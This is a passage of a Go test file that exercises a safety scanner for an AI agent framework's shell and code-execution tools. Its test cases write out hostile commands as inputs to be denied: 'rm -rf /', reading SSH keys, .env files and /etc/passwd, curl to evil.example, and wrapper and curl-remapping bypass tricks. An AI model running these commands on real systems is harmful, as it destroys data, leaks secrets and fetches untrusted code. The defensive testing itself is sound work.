//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"trpc.group/trpc-go/trpc-agent-go/codeexecutor"
	itool "trpc.group/trpc-go/trpc-agent-go/internal/tool"
	"trpc.group/trpc-go/trpc-agent-go/tool"
	codeexectool "trpc.group/trpc-go/trpc-agent-go/tool/codeexec"
	"trpc.group/trpc-go/trpc-agent-go/tool/hostexec"
	"trpc.group/trpc-go/trpc-agent-go/tool/workspaceexec"
)

func TestScanRequiredSamples(t *testing.T) {
	policy := DefaultPolicy()
	tests := []struct {
		name     string
		req      Request
		decision Decision
		ruleID   string
	}{
		{
			name: "safe go test",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "go test ./...",
			},
			decision: DecisionAllow,
		},
		{
			name: "dangerous delete",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "rm -rf /",
			},
			decision: DecisionDeny,
			ruleID:   "dangerous.rm_rf",
		},
		{
			name: "read key",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "cat ~/.ssh/id_rsa",
			},
			decision: DecisionDeny,
			ruleID:   "sensitive.path_access",
		},
		{
			name: "non whitelist network",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "curl https://evil.example/install.sh",
			},
			decision: DecisionDeny,
			ruleID:   "network.non_whitelisted_domain",
		},
		{
			name: "whitelist network",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "curl https://api.github.com/repos/trpc-group/trpc-agent-go",
			},
			decision: DecisionAllow,
		},
		{
			name: "shell wrapper bypass",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "bash -c 'curl https://evil.example/x'",
			},
			decision: DecisionDeny,
			ruleID:   "shell.bypass",
		},
		{
			name: "pipeline command",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "cat README.md | wc -l",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "shell.pipeline_review",
		},
		{
			name: "dependency install",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "npm install left-pad",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "dependency.environment_change",
		},
		{
			name: "long running sleep",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "sleep 9999",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "resource.long_sleep",
		},
		{
			name: "large output",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "yes x | head -c 9999999",
			},
			decision: DecisionDeny,
			ruleID:   "resource.large_output",
		},
		{
			name: "hostexec long session",
			req: Request{
				ToolName:       "exec_command",
				Backend:        BackendHostExec,
				Command:        "tail -f app.log",
				TimeoutSeconds: DefaultPolicy().MaxTimeoutSeconds,
				TTY:            true,
				Background:     true,
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "hostexec.long_session",
		},
		{
			name: "ask human review",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "python -c 'import subprocess; subprocess.run([\"go\", \"test\", \"./...\"])'",
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "import subprocess; subprocess.run(['go', 'test', './...'])",
				}},
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "codeexec.host_command_bridge",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(tt.req, policy)
			if report.Decision != tt.decision {
				t.Fatalf("decision = %q, want %q; report: %+v",
					report.Decision, tt.decision, report)
			}
			if tt.ruleID != "" && report.RuleID != tt.ruleID {
				t.Fatalf("rule id = %q, want %q; report: %+v",
					report.RuleID, tt.ruleID, report)
			}
			if err := ValidateReport(report); err != nil {
				t.Fatalf("report missing required fields: %v", err)
			}
		})
	}
}

func TestLoadPolicyChangesNetworkAllowlistWithoutCode(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "tool_safety_policy.yaml")
	content := []byte(`
network_allowlist:
  - example.com
denied_paths:
  - .env
`)
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "curl https://example.com/file",
	}, policy)
	if report.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow; report: %+v", report.Decision, report)
	}
	report = Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "curl https://api.github.com/repos/x/y",
	}, policy)
	if report.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny; report: %+v", report.Decision, report)
	}
}

func TestLoadPolicyCanDisablePipelineReview(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "tool_safety_policy.yaml")
	content := []byte(`
review_shell_pipelines: false
allowed_commands:
  - cat
  - wc
`)
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	}, policy)
	if report.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow; report: %+v", report.Decision, report)
	}
}

func TestLoadPolicyCanDisableParseErrorDeny(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "tool_safety_policy.json")
	content := []byte(`{
  "deny_on_parse_error": false,
  "allowed_commands": ["echo"]
}`)
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo 'unterminated",
	}, policy)
	if report.Decision != DecisionAsk || report.RuleID != "shellsafe.parse_error" {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestLoadPolicyRejectsUnknownFields(t *testing.T) {
	tests := []struct {
		name     string
		filename string
		content  string
	}{
		{
			name:     "JSON allowlist typo",
			filename: "policy.json",
			content:  `{"allowed_command":["go"]}`,
		},
		{
			name:     "JSON denylist typo",
			filename: "policy.json",
			content:  `{"denied_command":["sudo"]}`,
		},
		{
			name:     "JSON resource typo",
			filename: "policy.json",
			content:  `{"max_timeout_second":30}`,
		},
		{
			name:     "YAML allowlist typo",
			filename: "policy.yaml",
			content:  "allowed_command:\n  - go\n",
		},
		{
			name:     "YAML denylist typo",
			filename: "policy.yaml",
			content:  "denied_command:\n  - sudo\n",
		},
		{
			name:     "YAML resource typo",
			filename: "policy.yaml",
			content:  "max_output_byte: 1024\n",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), tt.filename)
			if err := os.WriteFile(path, []byte(tt.content), 0o600); err != nil {
				t.Fatal(err)
			}
			if _, err := LoadPolicy(path); err == nil {
				t.Fatal("LoadPolicy unknown field error = nil")
			}
		})
	}
}

func TestLoadPolicyRejectsInvalidUnknownToolAction(t *testing.T) {
	path := filepath.Join(t.TempDir(), "policy.yaml")
	if err := os.WriteFile(
		path,
		[]byte("unknown_tool_action: execute\n"),
		0o600,
	); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadPolicy(path); err == nil ||
		!strings.Contains(err.Error(), "unknown_tool_action") {
		t.Fatalf("LoadPolicy invalid unknown_tool_action error = %v", err)
	}
}

func TestLoadPolicyConfiguresUnknownToolAction(t *testing.T) {
	path := filepath.Join(t.TempDir(), "policy.yaml")
	if err := os.WriteFile(
		path,
		[]byte("unknown_tool_action: allow\n"),
		0o600,
	); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	decision, err := NewPermissionPolicy(policy).CheckToolPermission(
		context.Background(),
		&tool.PermissionRequest{ToolName: "unknown_tool"},
	)
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("action = %q, want allow", decision.Action)
	}
}

func TestAllowedCommandsRequireExactExecutable(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"go"}

	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "./go version",
	}, policy)
	if report.Decision != DecisionDeny ||
		report.RuleID != "policy.command_not_allowed" {
		t.Fatalf("workspace-relative executable should not match bare allow entry: %+v", report)
	}
}

func TestAllowedCommandsAreCaseSensitiveOutsideWindows(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Windows executable lookup is case-insensitive")
	}
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"go"}

	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "GO version",
	}, policy)
	if report.Decision != DecisionDeny ||
		report.RuleID != "policy.command_not_allowed" {
		t.Fatalf("allow entry should preserve executable case: %+v", report)
	}
}

func TestNetworkCommandsAtPathsRejectSchemeLessTarget(t *testing.T) {
	commands := []string{
		"/usr/bin/curl evil.example/install.sh",
		"./curl evil.example/install.sh",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				report.RuleID != "network.non_whitelisted_domain" {
				t.Fatalf("scheme-less non-allowlisted target should be denied: %+v", report)
			}
		})
	}
}

func TestWrappedNetworkCommandsRejectSchemeLessTarget(t *testing.T) {
	commands := []string{
		"env curl evil.example/install.sh",
		"command curl evil.example/install.sh",
		"timeout 5 curl evil.example/install.sh",
		"nice curl evil.example/install.sh",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				report.RuleID != "network.non_whitelisted_domain" {
				t.Fatalf("wrapped network command should be denied: %+v", report)
			}
		})
	}
}

func TestWrappedCommandsApplyPolicyToEffectiveCommand(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		decision Decision
		ruleID   string
		evidence string
	}{
		{
			name:     "env denied command",
			command:  "env sudo id",
			decision: DecisionDeny,
			ruleID:   "policy.denied_command",
			evidence: `command "sudo" is denied`,
		},
		{
			name:     "command destructive command",
			command:  "command rm -rf work/tmp",
			decision: DecisionDeny,
			ruleID:   "dangerous.rm_rf",
			evidence: "rm -rf work/tmp",
		},
		{
			name:     "timeout review command",
			command:  "timeout 5 npm install left-pad",
			decision: DecisionNeedsHumanReview,
			ruleID:   "dependency.environment_change",
			evidence: `command starts with "npm install"`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  tt.command,
			}, DefaultPolicy())
			if report.Decision != tt.decision || report.RuleID != tt.ruleID {
				t.Fatalf("unexpected wrapped command report: %+v", report)
			}
			if !slices.Contains(report.Evidence, tt.evidence) {
				t.Fatalf("evidence = %q, want effective command evidence %q",
					report.Evidence, tt.evidence)
			}
		})
	}
}

func TestWrappedCommandsApplyAllowlistToEveryCommand(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"env", "timeout"}
	for _, command := range []string{
		"env python payload.py",
		"env timeout 5 python payload.py",
	} {
		t.Run(command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, policy)
			if report.Decision != DecisionDeny ||
				report.RuleID != "policy.command_not_allowed" ||
				!strings.Contains(strings.Join(report.Evidence, " "), "python") {
				t.Fatalf("effective command should be rejected by allowlist: %+v", report)
			}
		})
	}
}

func TestUnresolvedCommandWrappersFailClosed(t *testing.T) {
	tests := []struct {
		name        string
		destructive string
		network     string
	}{
		{name: "xargs", destructive: "xargs sudo id", network: "xargs curl evil.example"},
		{name: "setsid", destructive: "setsid sudo id", network: "setsid curl evil.example"},
		{name: "unshare", destructive: "unshare sudo id", network: "unshare curl evil.example"},
		{name: "chroot", destructive: "chroot work sudo id", network: "chroot work curl evil.example"},
		{name: "runuser", destructive: "runuser -u nobody -- sudo id", network: "runuser -u nobody -- curl evil.example"},
		{name: "time", destructive: "time sudo id", network: "time curl evil.example"},
		{name: "ionice", destructive: "ionice sudo id", network: "ionice curl evil.example"},
		{name: "taskset", destructive: "taskset 1 sudo id", network: "taskset 1 curl evil.example"},
		{name: "stdbuf", destructive: "stdbuf -o0 sudo id", network: "stdbuf -o0 curl evil.example"},
		{name: "strace", destructive: "strace sudo id", network: "strace curl evil.example"},
		{name: "ltrace", destructive: "ltrace sudo id", network: "ltrace curl evil.example"},
		{name: "script", destructive: `script -c "sudo id" audit.log`, network: `script -c "curl evil.example" audit.log`},
		{name: "flock", destructive: "flock lockfile sudo id", network: "flock lockfile curl evil.example"},
	}

	for _, tt := range tests {
		for scenario, command := range map[string]string{
			"destructive": tt.destructive,
			"network":     tt.network,
		} {
			t.Run(tt.name+"/"+scenario, func(t *testing.T) {
				report := Scan(Request{
					ToolName: "workspace_exec",
					Backend:  BackendWorkspaceExec,
					Command:  command,
				}, DefaultPolicy())
				if report.Decision != DecisionDeny ||
					!reportHasRule(report, "shell.unresolved_wrapper") {
					t.Fatalf("unresolved wrapper should fail closed: %+v", report)
				}
			})
		}
	}
}

func TestNetworkCommandsRejectLoopbackTargets(t *testing.T) {
	commands := []string{
		"/usr/bin/curl 127.0.0.1",
		"/usr/bin/curl localhost",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				report.RuleID != "network.non_whitelisted_domain" {
				t.Fatalf("loopback network target should be denied: %+v", report)
			}
		})
	}
}

func TestCurlRemappingOptionsValidateReplacementTarget(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		decision Decision
		ruleID   string
	}{
		{
			name: "connect-to denied host",
			command: "curl --connect-to api.github.com:443:evil.example:443 " +
				"https://api.github.com/repos",
			decision: DecisionDeny,
			ruleID:   "network.non_whitelisted_domain",
		},
		{
			name: "connect-to allowed host assignment",
			command: "curl --connect-to=api.github.com:443:github.com:443 " +
				"https://api.github.com/repos",
			decision: DecisionAllow,
		},
		{
			name: "resolve denied address",
			command: "curl --resolve api.github.com:443:203.0.113.10 " +
				"https://api.github.com/repos",
			decision: DecisionDeny,
			ruleID:   "network.non_whitelisted_domain",
		},
		{
			name: "malformed remap requires review",
			command: "curl --connect-to broken " +
				"https://api.github.com/repos",
			decision: DecisionNeedsHumanReview,
			ruleID:   "network.unresolved_curl_remap",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  tt.command,
			}, DefaultPolicy())
			if report.Decision != tt.decision || report.RuleID != tt.ruleID {
				t.Fatalf("unexpected curl remapping report: %+v", report)
			}
		})
	}
}

func TestParseCurlRemapValueHandlesBracketedAddresses(t *testing.T) {
	targets, ok := parseCurlRemapValue(
		"--connect-to",
		"api.github.com:443:[2001:db8::1]:443",
	)
	if !ok || !slices.Equal(targets, []string{"[2001:db8::1]"}) {
		t.Fatalf("connect-to targets = %q, ok = %v", targets, ok)
	}

	targets, ok = parseCurlRemapValue(
		"--resolve",
		"api.github.com:443:[2001:db8::1],203.0.113.10",
	)
	if !ok || !slices.Equal(targets, []string{"[2001:db8::1]", "203.0.113.10"}) {
		t.Fatalf("resolve targets = %q, ok = %v", targets, ok)
	}
}

func TestGitNetworkOperationsValidateRemoteHost(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		decision Decision
		ruleID   string
	}{
		{
			name:     "deny SCP-like SSH remote",
			command:  "git clone git@evil.example:org/repo",
			decision: DecisionDeny,
			ruleID:   "network.non_whitelisted_domain",
		},
		{
			name:     "allow whitelisted SCP-like SSH remote",
			command:  "git clone git@github.com:trpc-group/trpc-agent-go.git",
			decision: DecisionAllow,
		},
		{
			name:     "review unresolved remote alias",
			command:  "git fetch origin",
			decision: DecisionNeedsHumanReview,
			ruleID:   "network.unresolved_target",
		},
		{
			name:     "allow local operation",
			command:  "git status",
			decision: DecisionAllow,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  tt.command,
			}, DefaultPolicy())
			if report.Decision != tt.decision || report.RuleID != tt.ruleID {
				t.Fatalf("unexpected Git network report: %+v", report)
			}
		})
	}
}

func TestEnvSplitStringFailsClosed(t *testing.T) {
	commands := []string{
		"env -S 'rm -rf /'",
		"env --split-string 'curl evil.example'",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				report.RuleID != "shell.env_split_string" {
				t.Fatalf("env split-string payload should fail closed: %+v", report)
			}
		})
	}
}

func TestDeniedPathsIncludeOptionValuesAndDotenvVariants(t *testing.T) {
	commands := []string{
		"node --env-file=.env app.js",
		"app --config=/etc/secrets",
		"cat production.env",
		"cat .env.production",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				!reportHasRule(report, "sensitive.path_access") {
				t.Fatalf("sensitive path should be denied: %+v", report)
			}
		})
	}
}

func TestMultilineBashCodeDoesNotReportParseError(t *testing.T) {
	report := Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "bash",
			Code:     "go test ./...\ngo vet ./...",
		}},
	}, DefaultPolicy())
	if reportHasRule(report, "shellsafe.parse_error") {
		t.Fatalf("valid multiline bash should not produce a parse error: %+v", report)
	}
}

func TestMultilineBashAfterEscapedQuoteRejectsNetworkTarget(t *testing.T) {
	report := Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "bash",
			Code:     "echo \"say \\\"hello\"\ncurl evil.example/install.sh",
		}},
	}, DefaultPolicy())
	if report.Decision != DecisionDeny ||
		report.RuleID != "network.non_whitelisted_domain" {
		t.Fatalf("network command after escaped quote should be denied: %+v", report)
	}
}

func TestShellBypassRedirectsRespectQuotes(t *testing.T) {
	for _, command := range []string{
		`echo "1 > 0"`,
		`echo '1 < 2'`,
	} {
		t.Run("quoted "+command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if reportHasRule(report, "shell.bypass") {
				t.Fatalf("quoted redirect character should be literal: %+v", report)
			}
		})
	}

	for _, command := range []string{
		"echo ok > output.txt",
		"cat < input.txt",
	} {
		t.Run("unquoted "+command, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny ||
				!reportHasRule(report, "shell.bypass") {
				t.Fatalf("unquoted redirect should be denied as a shell bypass: %+v", report)
			}
		})
	}
}

func TestPolicyZeroValueKeepsConservativeDefaults(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	}, Policy{})
	if report.Decision != DecisionNeedsHumanReview ||
		report.RuleID != "shell.pipeline_review" {
		t.Fatalf("zero-value policy should inherit pipeline review: %+v", report)
	}
}

func TestDefaultPolicyPreservesProgrammaticFalseOverrides(t *testing.T) {
	policy := DefaultPolicy()
	policy.ReviewShellPipelines = false
	policy.DenyOnParseError = false

	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	}, policy)
	if report.Decision != DecisionAllow {
		t.Fatalf("pipeline decision = %q, want allow; report: %+v", report.Decision, report)
	}

	report = Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo 'unterminated",
	}, policy)
	if report.Decision != DecisionAsk {
		t.Fatalf("parse decision = %q, want ask; report: %+v", report.Decision, report)
	}
}

func TestLoadPolicyErrors(t *testing.T) {
	if _, err := LoadPolicy(filepath.Join(t.TempDir(), "missing.yaml")); err == nil {
		t.Fatal("LoadPolicy missing file error = nil")
	}

	badJSON := filepath.Join(t.TempDir(), "bad.json")
	if err := os.WriteFile(badJSON, []byte(`{`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadPolicy(badJSON); err == nil {
		t.Fatal("LoadPolicy bad JSON error = nil")
	}

	badExt := filepath.Join(t.TempDir(), "policy.toml")
	if err := os.WriteFile(badExt, []byte(`allowed_commands = []`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadPolicy(badExt); err == nil {
		t.Fatal("LoadPolicy unsupported extension error = nil")
	}
}

func TestPermissionPolicyBlocksAndAudits(t *testing.T) {
	args := []byte(`{"command":"cat .env","timeout_sec":10}`)
	var audit bytes.Buffer
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditWriter(&audit))
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: args,
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("action = %q, want deny", decision.Action)
	}
	var event AuditEvent
	if err := json.Unmarshal(bytes.TrimSpace(audit.Bytes()), &event); err != nil {
		t.Fatalf("audit was not json: %v\n%s", err, audit.String())
	}
	if event.ToolName != "workspace_exec" ||
		event.Decision != DecisionDeny ||
		event.RuleID != "sensitive.path_access" ||
		!event.Blocked {
		t.Fatalf("unexpected audit event: %+v", event)
	}
}

func TestPermissionPolicyMapsReviewToAsk(t *testing.T) {
	args := []byte(`{"command":"npm install left-pad"}`)
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: args,
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAsk {
		t.Fatalf("action = %q, want ask", decision.Action)
	}
}

func TestPermissionPolicyResolvesHostExecDefaultTimeout(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{name: "omitted", args: `{"command":"go test ./..."}`},
		{name: "zero", args: `{"command":"go test ./...","timeout_sec":0}`},
		{name: "negative", args: `{"command":"go test ./...","timeout_sec":-1}`},
	}

	policy := NewPermissionPolicy(DefaultPolicy())
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, err := policy.CheckToolPermission(
				context.Background(),
				&tool.PermissionRequest{
					ToolName:  "exec_command",
					Arguments: []byte(tt.args),
				},
			)
			if err != nil {
				t.Fatal(err)
			}
			if decision.Action != tool.PermissionActionDeny ||
				!strings.Contains(decision.Reason, "resource.timeout_exceeded") ||
				!strings.Contains(decision.Reason, "1800s") {
				t.Fatalf("hostexec default timeout should be denied: %+v", decision)
			}
		})
	}

	decision, err := policy.CheckToolPermission(
		context.Background(),
		&tool.PermissionRequest{
			ToolName:  "exec_command",
			Arguments: []byte(`{"command":"go test ./...","timeout_sec":300}`),
		},
	)
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("bounded hostexec timeout should be allowed: %+v", decision)
	}
}

func TestPermissionPolicyMatchesExecutorTimeoutSemantics(t *testing.T) {
	hostSet, err := hostexec.NewToolSet()
	if err != nil {
		t.Fatal(err)
	}
	if closer, ok := hostSet.(interface{ Close() error }); ok {
		t.Cleanup(func() { _ = closer.Close() })
	}
	hostTool := hostSet.Tools(context.Background())[0]
	workspaceTool := &workspaceexec.ExecTool{}
	tests := []struct {
		name     string
		toolName string
		execTool tool.Tool
		args     string
		want     int
	}{
		{
			name: "workspace timeout_sec wins", toolName: "workspace_exec", execTool: workspaceTool,
			args: `{"command":"go test ./...","timeout":300,"timeout_sec":1000}`,
			want: 1000,
		},
		{
			name: "workspace legacy timeoutSec wins", toolName: "workspace_exec", execTool: workspaceTool,
			args: `{"command":"go test ./...","timeout":300,"timeoutSec":900}`,
			want: 900,
		},
		{
			name: "host ignores timeout", toolName: "exec_command", execTool: hostTool,
			args: `{"command":"go test ./...","timeout":300,"timeout_sec":1000}`,
			want: 1000,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
				Tool: tt.execTool, ToolName: tt.toolName, Arguments: []byte(tt.args),
			})
			if err != nil || !ok {
				t.Fatalf("parse request: ok=%v err=%v", ok, err)
			}
			if req.TimeoutSeconds != tt.want {
				t.Fatalf("timeout = %d, want %d", req.TimeoutSeconds, tt.want)
			}
		})
	}
}

func TestPermissionPolicyResolvesWorkspaceExecDefaultTimeout(t *testing.T) {
	policy := DefaultPolicy()
	policy.MaxTimeoutSeconds = 30
	guard := NewPermissionPolicy(policy)
	for _, args := range []string{
		`{"command":"go test ./..."}`,
		`{"command":"go test ./...","timeout_sec":0}`,
		`{"command":"go test ./...","timeout_sec":-1}`,
	} {
		decision, err := guard.CheckToolPermission(context.Background(), &tool.PermissionRequest{
			ToolName: "workspace_exec", Arguments: []byte(args),
		})
		if err != nil {
			t.Fatal(err)
		}
		if decision.Action != tool.PermissionActionDeny ||
			!strings.Contains(decision.Reason, "timeout 300s") {
			t.Fatalf("workspace default timeout should be denied: %+v", decision)
		}
	}
}

func TestPermissionPolicyScansResolvedHostExecWorkdir(t *testing.T) {
	set, err := hostexec.NewToolSet(hostexec.WithBaseDir("/etc"))
	if err != nil {
		t.Fatal(err)
	}
	if closer, ok := set.(interface{ Close() error }); ok {
		t.Cleanup(func() { _ = closer.Close() })
	}
	execTool := set.Tools(context.Background())[0]
	guard := NewPermissionPolicy(DefaultPolicy())
	for _, args := range []string{
		`{"command":"cat passwd","timeout_sec":300}`,
		`{"command":"cat file","workdir":"ssl","timeout_sec":300}`,
	} {
		decision, err := guard.CheckToolPermission(context.Background(), &tool.PermissionRequest{
			Tool: execTool, ToolName: "exec_command", Arguments: []byte(args),
		})
		if err != nil {
			t.Fatal(err)
		}
		if decision.Action != tool.PermissionActionDeny ||
			!strings.Contains(decision.Reason, "sensitive.cwd_access") {
			t.Fatalf("resolved host workdir should be denied: %+v", decision)
		}
	}
}

func TestPermissionPolicyReviewsInteractiveWrites(t *testing.T) {
	guard := NewPermissionPolicy(DefaultPolicy())
	tests := []struct {
		name     string
		toolName string
		args     string
		want     tool.PermissionAction
	}{
		{name: "host poll", toolName: "write_stdin", args: `{"session_id":"s"}`, want: tool.PermissionActionAllow},
		{name: "host write", toolName: "write_stdin", args: `{"session_id":"s","chars":"open('/etc/passwd')"}`, want: tool.PermissionActionAsk},
		{name: "workspace submit", toolName: "workspace_write_stdin", args: `{"session_id":"s","submit":true}`, want: tool.PermissionActionAsk},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, err := guard.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName: tt.toolName, Arguments: []byte(tt.args),
			})
			if err != nil {
				t.Fatal(err)
			}
			if decision.Action != tt.want {
				t.Fatalf("action = %q, want %q: %+v", decision.Action, tt.want, decision)
			}
		})
	}
}

func TestPermissionPolicyChecksNonShellCodePathsAndNetwork(t *testing.T) {
	tests := []struct {
		name string
		code string
		rule string
	}{
		{
			name: "denied Python path",
			code: `print(open('/etc/passwd').read())`,
			rule: "sensitive.path_access",
		},
		{
			name: "non-allowlisted Python socket",
			code: `socket.create_connection(('evil.example', 443))`,
			rule: "network.non_whitelisted_domain",
		},
		{
			name: "non-allowlisted chained Python socket",
			code: `socket.socket().connect(('evil.example', 443))`,
			rule: "network.non_whitelisted_domain",
		},
	}

	policy := NewPermissionPolicy(DefaultPolicy())
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args, err := json.Marshal(map[string]any{
				"code_blocks": []map[string]string{{
					"language": "python",
					"code":     tt.code,
				}},
			})
			if err != nil {
				t.Fatal(err)
			}
			decision, err := policy.CheckToolPermission(
				context.Background(),
				&tool.PermissionRequest{
					ToolName:  "execute_code",
					Arguments: args,
				},
			)
			if err != nil {
				t.Fatal(err)
			}
			if decision.Action != tool.PermissionActionDeny ||
				!strings.Contains(decision.Reason, tt.rule) {
				t.Fatalf("non-shell code policy was not enforced: %+v", decision)
			}
		})
	}
}

func TestPermissionPolicyRecognizesRenamedCodeExec(t *testing.T) {
	execTool := codeexectool.NewTool(
		&permissionCodeExecutor{timeout: 10 * time.Second, bounded: true},
		codeexectool.WithName("python_runner"),
	)
	guard := NewPermissionPolicy(DefaultPolicy())
	for _, tt := range []struct {
		name string
